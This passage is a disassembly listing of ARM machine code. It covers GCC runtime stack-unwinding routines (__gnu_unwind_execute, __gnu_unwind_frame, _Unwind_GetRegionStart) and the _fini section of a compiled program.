   1edf8:	e1a00403 	lsl	r0, r3, #8
   1edfc:	e5850000 	str	r0, [r5]
   1ee00:	e20220ff 	and	r2, r2, #255	; 0xff
   1ee04:	1a00000a 	bne	1ee34 <__gnu_unwind_execute+0x674>
   1ee08:	e202307f 	and	r3, r2, #127	; 0x7f
   1ee0c:	e28ccf81 	add	ip, ip, #516	; 0x204
   1ee10:	e08cce13 	add	ip, ip, r3, lsl lr
   1ee14:	e3a01000 	mov	r1, #0
   1ee18:	e1a00007 	mov	r0, r7
   1ee1c:	e3a0200d 	mov	r2, #13
   1ee20:	e1a03001 	mov	r3, r1
   1ee24:	e58dc00c 	str	ip, [sp, #12]
   1ee28:	e58d8000 	str	r8, [sp]
   1ee2c:	ebfffb07 	bl	1da50 <_Unwind_VRS_Set>
   1ee30:	eafffe67 	b	1e7d4 <__gnu_unwind_execute+0x14>
   1ee34:	e5d51008 	ldrb	r1, [r5, #8]
   1ee38:	eaffffd8 	b	1eda0 <__gnu_unwind_execute+0x5e0>
   1ee3c:	e5d53008 	ldrb	r3, [r5, #8]
   1ee40:	e3530000 	cmp	r3, #0
   1ee44:	12433001 	subne	r3, r3, #1
   1ee48:	15c53008 	strbne	r3, [r5, #8]
   1ee4c:	0a000014 	beq	1eea4 <__gnu_unwind_execute+0x6e4>
   1ee50:	e1a03c20 	lsr	r3, r0, #24
   1ee54:	e21320ff 	ands	r2, r3, #255	; 0xff
   1ee58:	e1a00400 	lsl	r0, r0, #8
   1ee5c:	e5850000 	str	r0, [r5]
   1ee60:	0affff0f 	beq	1eaa4 <__gnu_unwind_execute+0x2e4>
   1ee64:	e21310f0 	ands	r1, r3, #240	; 0xf0
   1ee68:	0affff19 	beq	1ead4 <__gnu_unwind_execute+0x314>
   1ee6c:	e3a00009 	mov	r0, #9
   1ee70:	eafffea1 	b	1e8fc <__gnu_unwind_execute+0x13c>
   1ee74:	e5d53009 	ldrb	r3, [r5, #9]
   1ee78:	e3530000 	cmp	r3, #0
   1ee7c:	0affff08 	beq	1eaa4 <__gnu_unwind_execute+0x2e4>
   1ee80:	e2433001 	sub	r3, r3, #1
   1ee84:	e5c53009 	strb	r3, [r5, #9]
   1ee88:	e5952004 	ldr	r2, [r5, #4]
   1ee8c:	e4920004 	ldr	r0, [r2], #4
   1ee90:	e3a03003 	mov	r3, #3
   1ee94:	e5852004 	str	r2, [r5, #4]
   1ee98:	e5c53008 	strb	r3, [r5, #8]
   1ee9c:	e5850000 	str	r0, [r5]
   1eea0:	eaffff8d 	b	1ecdc <__gnu_unwind_execute+0x51c>
   1eea4:	e5d53009 	ldrb	r3, [r5, #9]
   1eea8:	e3530000 	cmp	r3, #0
   1eeac:	0afffefc 	beq	1eaa4 <__gnu_unwind_execute+0x2e4>
   1eeb0:	e2433001 	sub	r3, r3, #1
   1eeb4:	e5c53009 	strb	r3, [r5, #9]
   1eeb8:	e5952004 	ldr	r2, [r5, #4]
   1eebc:	e4920004 	ldr	r0, [r2], #4
   1eec0:	e3a03003 	mov	r3, #3
   1eec4:	e5852004 	str	r2, [r5, #4]
   1eec8:	e5c53008 	strb	r3, [r5, #8]
   1eecc:	e5850000 	str	r0, [r5]
   1eed0:	eaffffde 	b	1ee50 <__gnu_unwind_execute+0x690>

0001eed4 <__gnu_unwind_frame>:
   1eed4:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1eed8:	e590c04c 	ldr	ip, [r0, #76]	; 0x4c
   1eedc:	e59c3004 	ldr	r3, [ip, #4]
   1eee0:	e24dd014 	sub	sp, sp, #20
   1eee4:	e1a03403 	lsl	r3, r3, #8
   1eee8:	e3a02003 	mov	r2, #3
   1eeec:	e58d3004 	str	r3, [sp, #4]
   1eef0:	e5cd200c 	strb	r2, [sp, #12]
   1eef4:	e5dc3007 	ldrb	r3, [ip, #7]
   1eef8:	e1a00001 	mov	r0, r1
   1eefc:	e28cc008 	add	ip, ip, #8
   1ef00:	e28d1004 	add	r1, sp, #4
   1ef04:	e58dc008 	str	ip, [sp, #8]
   1ef08:	e5cd300d 	strb	r3, [sp, #13]
   1ef0c:	ebfffe2b 	bl	1e7c0 <__gnu_unwind_execute>
   1ef10:	e28dd014 	add	sp, sp, #20
   1ef14:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1ef18:	e12fff1e 	bx	lr

0001ef1c <_Unwind_GetRegionStart>:
   1ef1c:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1ef20:	e3a01000 	mov	r1, #0
   1ef24:	e24dd014 	sub	sp, sp, #20
   1ef28:	e3a0200c 	mov	r2, #12
   1ef2c:	e1a03001 	mov	r3, r1
   1ef30:	e08dc002 	add	ip, sp, r2
   1ef34:	e58dc000 	str	ip, [sp]
   1ef38:	ebfffab1 	bl	1da04 <_Unwind_VRS_Get>
   1ef3c:	e59d300c 	ldr	r3, [sp, #12]
   1ef40:	e5930048 	ldr	r0, [r3, #72]	; 0x48
   1ef44:	e28dd014 	add	sp, sp, #20
   1ef48:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1ef4c:	e12fff1e 	bx	lr

Disassembly of section .fini:

0001ef50 <_fini>:
   1ef50:	e1a0c00d 	mov	ip, sp
   1ef54:	e92ddff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
   1ef58:	e24cb004 	sub	fp, ip, #4
   1ef5c:	e91baff0 	ldmdb	fp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, pc}
